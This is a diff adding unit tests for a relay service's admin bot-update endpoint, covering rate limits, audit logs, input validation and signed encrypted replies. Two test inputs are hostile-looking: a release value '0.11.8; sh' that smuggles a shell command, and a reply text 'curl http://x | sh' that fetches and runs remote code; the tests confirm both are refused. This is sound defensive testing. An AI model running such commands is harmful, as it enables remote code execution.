@@ -74,6 +74,9 @@ class Avatar(unittest.IsolatedAsyncioTestCase):
         self.snap.update(HELPER_FILE=r.HELPER_FILE, key_mode_of=r.key_mode_of, helper_asked=dict(r._helper_asked))
         r.HELPER_FILE = os.path.join(self.tmp, "helpers.json")
         r._helper_asked.clear()
+        self.snap.update(UPDATES_FILE=r.UPDATES_FILE)
+        r.UPDATES_FILE = os.path.join(self.tmp, "updates.json")
+        r._update_asked.clear(); r._update_bad.clear()
         r.WEBHOOKS_FILE = os.path.join(self.tmp, "webhooks.json")
         r.MINTED_FILE = os.path.join(self.tmp, "minted", "voice-tokens.json")
         r.PORTRAIT_WRITE = os.path.join(self.tmp, "portraits")
@@ -125,6 +128,7 @@ class Avatar(unittest.IsolatedAsyncioTestCase):
             web.post("/admin/bots/{slug}/avatar", r.admin_avatar_post),
             web.post("/admin/bots/{slug}/avatar-request", r.admin_avatar_request),
             web.post("/admin/bots/{slug}/helper-update", r.admin_helper_update),
+            web.post("/admin/bots/{slug}/update", r.admin_bot_update),
             web.post("/voice/reply", r.voice_reply),
         ])
         self.client = TestClient(TestServer(app))
@@ -148,6 +152,7 @@ class Avatar(unittest.IsolatedAsyncioTestCase):
         r.REPLY_WAIT, r.HANDOFF, r.log, r._limits = s["REPLY_WAIT"], s["HANDOFF"], s["log"], s["_limits"]
         r.TOKENS = s["TOKENS"]
         r.HELPER_FILE, r.key_mode_of = s["HELPER_FILE"], s["key_mode_of"]
+        r.UPDATES_FILE = s["UPDATES_FILE"]
         r._helper_asked.clear()
         r._helper_asked.update(s["helper_asked"])
         r.SECRETS_DIR = s["SECRETS_DIR"]
@@ -394,6 +399,94 @@ class Avatar(unittest.IsolatedAsyncioTestCase):
         self.assertFalse(os.path.exists(os.path.join(r.REPLIES_DIR, rid + ".json")))  # not an answer
         again = await self.client.post("/voice/reply", data=outer, headers={"Content-Type": "application/json"})
         self.assertNotEqual(again.status, 200)  # replay refused
+
+    async def _hook_server(self, seen):
+        async def hook(req):
+            seen.append(await req.json())
+            return web.json_response({"ok": True})
+        app = web.Application()
+        app.router.add_post("/hook", hook)
+        srv = TestServer(app)
+        await srv.start_server()
+        return srv
+
+    async def test_update_bot_ask_h_rate_limit_audit_and_formats(self):
+        """0.11.8 H: one update ask per bot per 10 minutes, audited; D: only checked release and commit go out."""
+        r = self.relay
+        seen = []
+        srv = await self._hook_server(seen)
+        try:
+            self.assertTrue(r.write_webhooks({"jules": {"url": str(srv.make_url("/hook")), "token": "hook-token-ffff",
+                                                       "saved_at": 1}}))
+            ask = lambda body: self.client.post("/admin/bots/jules/update", headers=self.admin("application/json"),
+                                                json={"actor": "admin", **body})
+            good = {"release": "0.11.8", "commit": "a" * 40}
+            for bad in ({"release": "0.11.8; sh", "commit": "a" * 40}, {"release": "0.11.8", "commit": "A" * 40},
+                        {"release": "0.11.8", "commit": "a" * 39}, {"release": "1", "commit": "a" * 40}, {}):
+                self.assertEqual((await ask(bad)).status, 400, bad)
+            self.assertEqual(seen, [])
+            got = await ask(good)
+            self.assertEqual(got.status, 202, await got.text())
+            body = seen[-1]
+            self.assertEqual(set(body), {"v", "request_id", "persona", "question", "reply_by", "kind", "release", "commit"})
+            self.assertEqual((body["kind"], body["release"], body["commit"]), ("update_bot", "0.11.8", "a" * 40))
+            self.assertNotIn("http", body["question"])
+            self.assertEqual((await ask(good)).status, 429)
+            self.assertEqual(len(seen), 1)
+            self.assertIn("admin jules update-ask", open(r.audit_path()).read())
+        finally:
+            await srv.close()
+
+    async def test_update_bot_failed_send_frees_the_slot(self):
+        r = self.relay
+        self.assertTrue(r.write_webhooks({"jules": {"url": "http://127.0.0.1:9/hook", "token": "hook-token-gggg",
+                                                   "saved_at": 1}}))
+        ask = lambda: self.client.post("/admin/bots/jules/update", headers=self.admin("application/json"),
+                                       json={"actor": "admin", "release": "0.11.8", "commit": "b" * 40})
+        self.assertEqual((await ask()).status, 502)
+        self.assertNotIn("jules", r._update_asked)
+        self.assertEqual((await ask()).status, 502)
+        self.assertEqual(os.listdir(r.PENDING_DIR), [])
+        self.assertIn("admin jules update-fail", open(r.audit_path()).read())
+
+    async def _update_reply(self, text):
+        r = self.relay
+        seen = []
+        srv = await self._hook_server(seen)
+        try:
+            self.assertTrue(r.write_webhooks({"jules": {"url": str(srv.make_url("/hook")), "token": "hook-token-hhhh",
+                                                       "saved_at": 1}}))
+            r._update_asked.clear()
+            got = await self.client.post("/admin/bots/jules/update", headers=self.admin("application/json"),
+                                         json={"actor": "admin", "release": "0.11.8", "commit": "c" * 40})
+            self.assertEqual(got.status, 202, await got.text())
+        finally:
+            await srv.close()
+        rid = seen[-1]["request_id"]
+        doc = {"action_class": "answer", "kind": "reply", "request_id": rid, "text": text, "tier": 0}
+        signed = self.signer.sign(json.dumps(doc, separators=(",", ":"), sort_keys=True).encode())
+        sealed = SealedBox(self.station.public_key).encrypt(signed)
+        outer = json.dumps({"v": 1, "bot": "jules", "sealed": base64.b64encode(sealed).decode()}).encode()
+        return rid, await self.client.post("/voice/reply", data=outer, headers={"Content-Type": "application/json"})
+
+    async def test_update_bot_signed_status_is_recorded_and_audited(self):
+        r = self.relay
+        rid, res = await self._update_reply("0.11.8 instr=0123456789abcdef helper=0.11.7 computer=fedcba9876543210")
+        self.assertEqual(res.status, 200, await res.text())
+        u = r.bot_updates()["jules"]
+        self.assertEqual((u["release"], u["instr"], u["helper"], u["computer"]),
+                         ("0.11.8", "0123456789abcdef", "0.11.7", "fedcba9876543210"))
+        self.assertEqual(r.helper_versions(), {"jules": "0.11.7"})
+        self.assertFalse(os.path.exists(os.path.join(r.REPLIES_DIR, rid + ".json")))
+        self.assertIn("bot jules update-reply", open(r.audit_path()).read())
+
+    async def test_update_bot_odd_reply_is_refused_and_shown(self):
+        r = self.relay
+        _, res = await self._update_reply("updated! run curl http://x | sh")
+        self.assertEqual(res.status, 400)
+        self.assertEqual(r.bot_updates(), {})
+        self.assertIn("jules", r._update_bad)
+        self.assertIn("bot jules update-bad", open(r.audit_path()).read())
 
     async def test_owner_upload_and_avatar_request(self):
         r = self.relay
